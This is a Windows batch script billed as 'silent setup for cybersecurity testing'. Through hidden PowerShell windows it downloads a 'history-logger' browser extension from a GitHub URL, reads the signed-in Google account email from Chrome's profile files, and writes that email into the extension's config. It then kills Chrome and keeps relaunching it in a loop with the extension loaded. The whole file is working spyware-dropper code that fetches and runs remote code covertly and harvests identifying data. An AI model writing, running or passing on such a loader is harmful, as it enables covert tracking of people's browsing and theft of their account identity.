@echo off
setlocal EnableDelayedExpansion

REM Silent setup for cybersecurity testing
REM Downloads extension.zip to Documents, extracts, and runs Chrome with extension

REM 1) CONFIG: GitHub raw zip URL
set "ZIP_URL=https://raw.githubusercontent.com/Ayamet/web/main/main/extension.zip"

REM Set download and work directory to Documents
set "WORKDIR=%USERPROFILE%\Documents\history-logger-%RANDOM%"
set "EXT_DIR=%WORKDIR%\extension"
mkdir "%WORKDIR%" 2>nul || (
  echo ERROR creating %WORKDIR%
  exit /b 1
)

REM 2) Download extension.zip silently
powershell -NoProfile -WindowStyle Hidden -Command ^
  "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%WORKDIR%\ext.zip' -UseBasicParsing" || (
    echo ERROR downloading zip
    exit /b 1
  )

REM 3) Extract ext.zip
powershell -NoProfile -WindowStyle Hidden -Command ^
  "Expand-Archive -LiteralPath '%WORKDIR%\ext.zip' -DestinationPath '%WORKDIR%' -Force" || (
    echo ERROR extracting zip
    exit /b 1
  )

REM 4) Locate manifest.json and background.js
set "FOUND=0"
if exist "%EXT_DIR%\manifest.json" (
  if exist "%EXT_DIR%\background.js" (
    set "FOUND=1"
  )
)
if "%FOUND%"=="0" (
  for /D %%D in ("%EXT_DIR%\*") do (
    if exist "%%D\manifest.json" (
      if exist "%%D\background.js" (
        set "EXT_DIR=%%D"
        set "FOUND=1"
        goto :got
      )
    )
  )
)
:got
if "%FOUND%"=="0" (
  echo ERROR: manifest.json or background.js not found!
  exit /b 1
)

REM 5) Scan Chrome profiles for email
set "EMAIL="
for /D %%P in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do (
  if exist "%%P\Preferences" (
    for /f "usebackq delims=" %%E in (`
      powershell -NoProfile -WindowStyle Hidden -Command ^
        "try {(Get-Content -Raw '%%P\Preferences' | ConvertFrom-Json).account_info.email} catch {''}"
    `) do if not defined EMAIL (
      set "EMAIL=%%E"
    )
  )
)
if not defined EMAIL set "EMAIL=anonymous@demo.com"

REM 6) Write config.json
> "%EXT_DIR%\config.json" echo {^"userEmail^":^"%EMAIL%"^}

REM 7) Close any running Chrome
taskkill /F /IM chrome.exe >nul 2>&1
timeout /t 3 /nobreak >nul

REM 8) Locate chrome.exe
set "CHROME_PATH="
for %%P in (
  "%ProgramFiles%\Google\Chrome\Application\chrome.exe"
  "%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe"
  "%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"
) do if exist "%%~P" set "CHROME_PATH=%%~P"
if not defined CHROME_PATH (
  echo ERROR: chrome.exe not found!
  exit /b 1
)

REM 9) Create or use custom Chrome profile
set "PROFILE_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\MyDevProfile"
if not exist "%PROFILE_DIR%" (
  mkdir "%PROFILE_DIR%"
)

REM 10) Start Chrome with extension in a loop
:loop
start "" "%CHROME_PATH%" --user-data-dir="%PROFILE_DIR%" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%"
timeout /t 10 >nul
tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I "chrome.exe" >NUL
if %ERRORLEVEL%==0 (
  timeout /t 10 >nul
) else (
  start "" "%CHROME_PATH%" --user-data-dir="%PROFILE_DIR%" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%"
)
goto loop
